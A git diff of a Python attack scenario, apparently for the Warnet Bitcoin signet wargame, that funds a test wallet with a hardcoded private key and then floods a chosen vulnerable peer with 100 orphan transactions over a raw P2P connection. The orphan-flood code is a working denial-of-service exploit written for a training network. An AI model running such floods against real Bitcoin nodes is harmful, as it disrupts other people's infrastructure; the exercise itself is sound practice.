@@ -6,12 +6,16 @@ from time import sleep
 from commander import Commander
 
 # The entire Bitcoin Core test_framework directory is available as a library
-from test_framework.messages import hash256, msg_tx
+from test_framework.messages import hash256, msg_tx, CTransaction
 from test_framework.p2p import MAGIC_BYTES, P2PInterface
 from test_framework.wallet import (
     MiniWallet,
     MiniWalletMode,
 )
+
+from test_framework.authproxy import JSONRPCException
+
+from test_framework.script_util import key_to_p2pk_script
 
 
 def get_signet_network_magic_from_node(node):
@@ -41,32 +45,6 @@ class Orphan50(Commander):
     # Scenario entrypoint
     def run_test(self):
         self.log.info("Starting orphan scenario")
-        self.log.info("Mining blocks to generate UTXOs")
-        self.wallet = MiniWallet(self.nodes[0], mode=MiniWalletMode.RAW_P2PK)
-
-        # Sorry about this wait, just need to mine a load, because of PoW on signet not every call ends in a block
-        for i in range(3000):
-            # this is a bit slow so done in 4 steps to prevent timeouts
-            self.generate(self.wallet, 100)
-            self.log.info(f"Mining attempt, {i+1} out of 3000")
-        sleep(10)
-
-        # Change this number to prevent someone from spending your coins
-        # private_key = 5390
-        # self.wallet._priv_key.set((private_key).to_bytes(32, "big"), True)
-        # pub_key = self.wallet._priv_key.get_pubkey()
-        # self.wallet._scriptPubKey = key_to_p2pk_script(pub_key.get_bytes())
-
-        # Just like a typical Bitcoin Core functional test, this executes an
-        # RPC on a node in the network. The actual node at self.nodes[0] may
-        # be different depending on the user deploying the scenario. Users in
-        # Warnet may have different namepsace access but everyone should always
-        # have access to at least one node.
-        peerinfo = self.nodes[0].getpeerinfo()
-        for peer in peerinfo:
-            # You can print out the the scenario logs with `warnet logs`
-            # which have a list of all this node's peers' addresses and version
-            self.log.info(f"{peer['addr']} {peer['subver']}")
 
         # We pick a node on the network to attack
         # We know this one is vulnderable to 50 orphans based on it's subver
@@ -94,6 +72,88 @@ class Orphan50(Commander):
         )()
         attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
 
+        node0_p2p = P2PInterface()
+        node0_p2p.peer_connect(
+            dstaddr=self.nodes[0].rpchost,
+            dstport=dstport,
+            net="signet",
+            timeout_factor=1,
+        )()
+        node0_p2p.wait_until(lambda: attacker.is_connected, check_connected=False)
+
+        # the first node as listed in `warnet status`
+        # would be miner in scrimmage and most likely armada-0 in battleground
+        self.wallet = MiniWallet(self.nodes[0], mode=MiniWalletMode.RAW_P2PK)
+        # Change this number to prevent someone from spending your coins
+        private_key = 5390
+        self.wallet._priv_key.set((private_key).to_bytes(32, "big"), True)
+        pub_key = self.wallet._priv_key.get_pubkey()
+        self.wallet._scriptPubKey = key_to_p2pk_script(pub_key.get_bytes())
+
+        # Can only generate on Scrimmage as it is using OP_TRUE as the signet challenge
+        # mining_worked = True
+        # self.log.info("Mining blocks to generate UTXOs")
+        # try:
+        #     for _ in range(100):
+        #         self.generate(self.wallet, 100)
+        #         self.log.info(f"Mining attempt, {i+1} out of 100")
+        # except Exception:
+        #     pass
+
+        miniwallet_balance = self.wallet.get_balance()
+        self.log.info(f"MiniWallet Balance: {miniwallet_balance}")
+
+        # if balance is 0 then self mining did not work as we are probably running on Battleground
+        # will need to request some funds from the faucet
+        # if miniwallet_balance == 0:
+        try:
+            self.nodes[0].createwallet("miner", False, None, None, False, True, False)
+        except JSONRPCException:
+            pass
+
+        try:
+            self.nodes[0].loadwallet("miner")
+        except JSONRPCException:
+            pass
+
+        wallet = self.nodes[0].get_wallet_rpc("miner")
+        unspent = wallet.listunspent()
+        if not unspent:
+            self.log.info("Do not have any funds with which to load into MiniWallet")
+            address = wallet.getnewaddress()
+            self.log.info(f"Request the faucet to send funds to {address}")
+            self.log.info("Then rerun this scenario")
+            return
+
+        for utxo in unspent:
+            self_transfer_tx = self.wallet.create_self_transfer_multi(
+                utxos_to_spend=[
+                    {
+                        "txid": utxo["txid"],
+                        "vout": utxo["vout"],
+                        "value": utxo["amount"],
+                    }
+                ],
+                num_outputs=100,
+            )
+            # sign it
+            signed = wallet.signrawtransactionwithwallet(
+                self_transfer_tx["tx"].serialize().hex()
+            )
+            self.nodes[0].sendrawtransaction(signed["hex"])
+            self.log.info(
+                f"Spent UTXO {utxo['txid']}:{utxo['vout']} from orphan wallet into MiniWallet"
+            )
+
+        sleep(5)
+        self.wallet.rescan_utxos()
+
+        # for i in range(100):
+        #     self.generate(self.wallet, 100)
+        #     self.log.info(f"Mining attempt, {i+1} out of 100")
+        miniwallet_utxos = self.wallet.get_utxos(mark_as_spent=False)
+        self.log.info(f"MiniWallet UTXOs: {miniwallet_utxos}")
+
         for i in range(100):
             # make a transaction that doesn't arrive
 
@@ -101,8 +161,21 @@ class Orphan50(Commander):
 
             # send the orphan, perhaps like this:
             # attacker.send_and_ping(msg_tx(tx_orphan["tx"]))
-
             self.log.info(f"Sent orphan {i+1} of 100")
+
+            # REMOVE THIS
+            tx_parent_doesnt_arrive = self.wallet.create_self_transfer()
+            utxo_to_spend = {
+                "txid": tx_parent_doesnt_arrive["txid"],
+                "vout": tx_parent_doesnt_arrive["new_utxo"]["vout"],
+                "value": tx_parent_doesnt_arrive["new_utxo"]["value"],
+            }
+            tx_orphan = self.wallet.create_self_transfer(
+                utxo_to_spend=utxo_to_spend, confirmed_only=False
+            )
+
+            attacker.send_and_ping(msg_tx(tx_orphan["tx"]))
+            # END REMOVE
 
 
 def main():
